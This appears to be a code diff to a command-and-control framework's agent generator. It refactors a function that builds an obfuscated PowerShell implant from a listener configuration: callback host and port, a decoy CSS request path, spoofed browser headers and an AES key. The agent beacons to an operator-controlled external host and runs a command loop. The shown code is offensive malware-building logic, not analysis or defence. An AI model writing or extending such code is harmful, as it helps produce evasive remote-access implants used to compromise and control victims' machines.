@@ -1280,29 +1280,32 @@ execCommandLoop'''
             except Exception:
                 return "127.0.0.1"
     
-    def generate_agent(self, custom_ip=None):
+    def generate_agent(self, listener_config, custom_ip=None):
+        """Generate an obfuscated PowerShell agent for the given listener.
+
+        listener_config must have:
+          - bind_port (int)
+          - protocol  (str)  e.g. 'http' / 'https'
+          - profile   (dict) with 'http' and 'upstream' sub-dicts
+        """
         try:
-            profile = self.config_loader.get_agent_profile_config()
-            server_ip = custom_ip or self._get_server_ip()
-            bind_config = profile.get('bind', {})
-            protocol = bind_config.get('protocol', 'http')
-            
+            profile = listener_config['profile']
+            protocol = listener_config.get('protocol', 'http')
+            port = listener_config.get('bind_port', 443 if protocol == 'https' else 80)
+
             http_config = profile.get('http', {})
             user_agent = http_config.get('user_agent', 'Mozilla/5.0')
             uris = http_config.get('uris', [])
             request_headers = http_config.get('request_headers', [])
-            
-            upstream_config = profile.get('upstream', {})
-            hosts = upstream_config.get('hosts', [])
-            
+
             aes_key = self.config_loader.get_aes_key()
-            port = bind_config.get('port', 443 if protocol == 'https' else 80)
 
             main_uri = uris[0] if uris else "/main.c76af346.css"
-            main_host = hosts[0] if hosts else "localhost"
+            main_host = listener_config.get('upstream_host') or 'localhost'
+            external_host = listener_config.get('external_host') or main_host
 
             default_port = 443 if protocol == 'https' else 80
-            agent_url = main_host if port == default_port else f"{main_host}:{port}"
+            agent_url = external_host if port == default_port else f"{external_host}:{port}"
 
             ps_headers = self._build_powershell_headers(request_headers, main_host, user_agent)
 
@@ -1328,12 +1331,12 @@ execCommandLoop'''
             ).replace(
                 '{{AGENT_HEADERS}}', ps_headers
             )
-            
+
             obfuscated_agent = self._obfuscate_script_content(configured_agent)
-            
+
             self.logger.log_event(f"AGENT GENERATOR - WebClient obfuscated agent generated! ({self.amount_of_arrays} arrays, {len(self.created_arrays)} mappings)")
             return obfuscated_agent
-            
+
         except Exception as e:
             error_msg = f"Error generating obfuscated agent: {e}"
             print(f"\033[91m[ERROR]\033[0m AGENT GENERATOR - {error_msg}")
@@ -1345,16 +1348,18 @@ execCommandLoop'''
             headers_dict = {
                 "Host": main_host,
                 "User-Agent": f'"{user_agent}"',
-                "Accept": '"*/*"'
             }
-            
+
             for header_line in request_headers:
                 if ':' in header_line:
                     key, value = header_line.split(':', 1)
                     key = key.strip()
                     value = value.strip().strip('"')
-                    if key.lower() not in ['host', 'user-agent', 'accept']:
+                    if key.lower() not in ('host', 'user-agent'):
                         headers_dict[key] = f'"{value}"'
+
+            if not any(k.lower() == 'accept' for k in headers_dict):
+                headers_dict['Accept'] = '"*/*"'
             
             ps_headers = '$global:headers = @{\n'
             max_key_length = max(len(key) for key in headers_dict.keys())
